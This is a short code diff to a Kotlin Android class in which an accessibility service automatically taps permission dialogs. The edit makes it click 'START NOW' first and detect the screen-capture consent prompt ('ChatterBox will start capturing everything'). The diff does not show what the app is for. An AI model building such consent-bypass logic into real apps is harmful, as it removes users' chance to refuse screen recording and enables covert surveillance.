@@ -61,6 +61,7 @@ class PermissionDialogs(private val accessibilityService: AccessibilityService) 
 
             // Try each possible permission button in order of preference
             val buttonTexts = arrayOf(
+                "START NOW",
                 "WHILE USING THE APP",
                 "While using the app",
                 "ALLOW",
@@ -70,8 +71,7 @@ class PermissionDialogs(private val accessibilityService: AccessibilityService) 
                 "OK",
                 "ONLY THIS TIME",
                 "Yes",
-                "YES",
-                "START NOW"
+                "YES"
             )
 
             for (buttonText in buttonTexts) {
@@ -110,7 +110,11 @@ class PermissionDialogs(private val accessibilityService: AccessibilityService) 
             "permission",
             "would like to",
             "access",
-            "Start recording or casting"
+            "Start recording or casting",  // This one is already there
+            "Screen capture",  // Add this for media projection dialog
+            "starts now",      // Add this for media projection dialog
+            "will start capturing",  // Add this for media projection dialog
+            "ChatterBox will start capturing everything"  // Add this more specific text
         )
 
         for (text in permissionTexts) {
@@ -122,7 +126,6 @@ class PermissionDialogs(private val accessibilityService: AccessibilityService) 
 
         return false
     }
-
     /**
      * Try to click buttons using resource IDs
      */
